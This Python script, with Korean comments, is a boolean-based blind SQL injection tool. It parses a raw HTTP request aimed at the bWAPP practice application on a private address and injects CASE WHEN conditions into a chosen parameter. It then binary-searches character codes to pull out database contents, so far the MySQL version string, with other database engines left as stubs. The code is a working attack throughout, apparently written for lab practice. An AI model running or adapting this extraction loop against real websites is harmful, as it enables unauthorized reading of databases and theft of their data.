# -*- coding: utf-8 -*-   
from time import sleep
import sys
# import pandas as pd
import urllib
import requests
import warnings
import argparse

warnings.filterwarnings('ignore')

output_check = False
args = None
message = "Iron" # is True

REQUEST_STRING = """
GET /bWAPP/sqli_1.php?test=abcd&title=iron1'+or+('iron'+=+case+when+1=1+then+'iron'+end)+--+ HTTP/1.1
Host: 192.168.0.32:8080
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.32:8080/bWAPP/sqli_1.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=f1001c1dea140c43127781a3954c1e8d; security_level=0
Connection: keep-alive


"""

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s",dest="schema", help="http? https?")
    parser.add_argument("-p", dest="parameter", help="target param")
    parser.add_argument("--dbms", dest="dbms", help="Select DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
    parser.add_argument("--basic", action="store_true", help="Basic info extraction")
    parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
    parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
    # parser.add_argument("-s", "--sleep",dest="tables", help="seleep?")
    # parser.add_argument("-s", "--columns",dest="columns", help="http? https?")
    # parser.add_argument("-s", "--schema",dest="schema", help="http? https?")
    options = parser.parse_args()
    if not options.parameter or not options.schema:
        parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
    return options

def url_encode(item):
    return urllib.parse.quote(item).replace('%20', '+').replace('%3D', '=').replace('%27', '\'').replace('%28','(').replace('%29',')').replace('%3E', '>').replace('%2C', ',').replace('%3C', '>')

def url_decode(item):
    return urllib.parse.unquote(item).replace('+', ' ')

def parse_request(request):
    # global method, url, path, headers, data, param, condition
    payloads = setpayload() # 페이로드 셋팅
    lines = request.split("\n") # 한줄씩 쪼개서 넣기
    method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
    headers = {} # 헤더 딕셔너리
    data = {} # GET 파라미터 딕셔너리
    path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bbb
    param = param_tmp
    if method == 'GET': # GET방식일경우 
        for line in lines[2:]:
            if ":" in line:
                key, value = line.split(": ")
                headers[key] = value # 딕셔너리에 {헤더 : 값}
        for get_param in param.split("&"):
            key, value = get_param.split("=", 1)
            data[key] = value # 딕셔너리에 {파라미터 : 값}
        url = headers['Host']   
        condition = url_decode(data[args.parameter])

    else: # 이외 POST 등 일경우 body 값 파싱
        headers_string, data_string = REQUEST_STRING.split("\n\n")
        for line in headers_string.split("\n"):
            if ":" in line:
                key, value = line.split(": ")
                headers[key] = value
        for param in data_string.split("&"):
            key, value = param.split("=")
            data[key] = value
    # data[args.parameter] = condition.replace('1=1', payloads['len']) # 조건식에서 1=1 을 찾아서 payload로 변경 후 data에 삽입
    # print(data[args.parameter])
    return (
    {
        'method': method,
        'url': url,
        'path': path,
        'headers': headers,
        'data': data,
    }, condition, payloads
)
def payload_set(condition, payloads):
    result_payload = {}
    for key, value in payloads.items():
        payload_tmp = condition.replace('1=1', value)
        result_payload[key] = payload_tmp

    return result_payload

def setpayload():   # i : 레코드 열,  j : subsing 위치 값 
    global output_check

    dbms = args.dbms.lower()

    if dbms == 'oracle':
        if args.basic:
            print("Oracle 기본 정보 출력 Start")
            payloads = "----------------------------------------"
        elif args.dbs:
            print("Oracle DB 출력 Start")
            payloads = "----------------------------------------"
        else:
            print("Use --help for more info. (oracle)")

    elif dbms == 'mysql':
        if args.basic:
            print("MySQL 기본 정보 출력 Start")
            
            payloads = {
                'len': "(select length((select @@version)))>{mid}",
                'version' : "ascii(substr((select @@version),{substring_index},1))>{mid}"
                # 'version': "iron1' or ('{message}' = case when ascii(substr((select @@version),{substring_index},1))>{mid} then '{message}' end) -- "
          
      
                }
            return payloads
        if args.dbs:
            print("MySQL DB 출력 Start")
            payloads = "----------------------------------------"
        else:
            print("Use --help for more info. (mysql)")

    elif dbms == 'mssql':
        if args.basic:
            print("MSSQL 기본 정보 출력 Start")
            payloads = "----------------------------------------"
        elif args.dbs:
            print("MSSQL DB 출력 Start")
            payloads = "----------------------------------------"
        else:
            print("Use --help for more info. (mssql)")

    elif dbms == 'postgresql':
        if args.basic:
            print("PostgreSQL 기본 정보 출력 Start")
            payloads = [
                # "'||(CASE WHEN ascii(substr((select version()),{substring_index},1))>{mid} THEN '{message}' ELSE 'Characterization' END)||'",
                # "'||(CASE WHEN ascii(substr((select version()),{substring_index},1))>{mid} THEN '{message}' ELSE '11111' END)||'"
            ]
        elif args.dbs:
            print("PostgreSQL DB 출력 Start")
            payloads = "----------------------------------------"
        else:
            print("Use --help for more info. (postgresql)")

    else:
        print("Unsupported DBMS. Use --help for more info.")

def recursive(list_val, min_val, max_val, record_index, substring_index, parse_val, payload_fix):
    mid = int((min_val+max_val)/2)
    test = payload_fix
    test = test.format(substring_index=substring_index, mid=mid, message=message)
    parse_val['data'][args.parameter] = test
    bin_result = connection(**parse_val) # payload 삽입 및 요청
    
    if max_val - min_val <= 1:
        if bin_result:
            return max_val
        return min_val         
    if bin_result: # 30 130 160 / 2 = 80
        return recursive(list_val, mid, max_val, record_index, substring_index, parse_val, payload_fix)
    return recursive(list_val, min_val, mid, record_index, substring_index, parse_val, payload_fix)
        
def connection(data, method, url, path, headers):
    data[args.parameter] = url_decode(data[args.parameter])
    data[args.parameter] = url_encode(data[args.parameter])
    params = '&'.join([f"{key}={value}" for key, value in data.items()])      
    # print(params)  
    url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
    proxies = {'http': args.proxy, 'https': args.proxy}
    timeout = 30
    response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)

    if message in response.text: 
        return 1    # true
    return 0    # false

def query_start():
    parse, condition, payloads = parse_request(REQUEST_STRING)
    result_payload = payload_set(condition, payloads)
    list_val = ['USERID'] # 컬럼명 입력
    name_str = '' # 한문자 씩 찾아서 저장할 변수
    name_tmp = [] #  name_str 에 저장된 변수를 append 할 배열변수
    name_str_list = [[0]*1 for i in list_val] # name_tmp 에 저장된 값들을 2차원 배열로 저장, 배열 선언 1 x n 배열 선언
    dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수

    name_list = 1 # 데이터 갯수(행) -> 카운트 구해서 값
    name_len  = recursive(list_val[0],0,127,1,1, parse, result_payload['len'])
    print(name_len)
    for m in range(0, len(list_val), 1): #  테이블, 컬럼 지정
        # print(f">> {list_val[m]}")
        for record_index in range(0, name_list, 1): #   몇번째 데이터 뽑을지 씀  ex) (5, name_list, 1) -> 5번째 부터 뽑음
            for substring_index in range(0, name_len, 1): # name_len 길이만큼 조회     
                name_str += chr(recursive(list_val[m],0,127,record_index,substring_index+1, parse, result_payload['version']))
                print(f"[*]{record_index +1}번 행 결과 : {name_str}") # 최종 추출한 데이터
                
            name_tmp.append(name_str) # tmp에 결과 값 추가


                        # else : # [j END]
                            # print(setpayload(list_val[m],32,127,i,j))
                            # print(f"{name_str}") # 한문자씩 추출한 테이터 확인
                    # name_str = ''                 

        name_str_list[m] = name_tmp # append 한 값들을 2차원 배열에 저장
        # print(f">> {m}번 배열에 데이터 저장")
        name_tmp =[] # [m END]
    print("\n>> 배열 출력")
    for i in name_str_list :
        for j in i:
            print(j,end=" ")
        print()

if __name__ == '__main__':
    print ("=================================================================")
    print ("Blind SQL Injection")
    print ("=================================================================\n")
    print ("Start!!\n")
    args = get_argument()
    print(args)

    query_start()
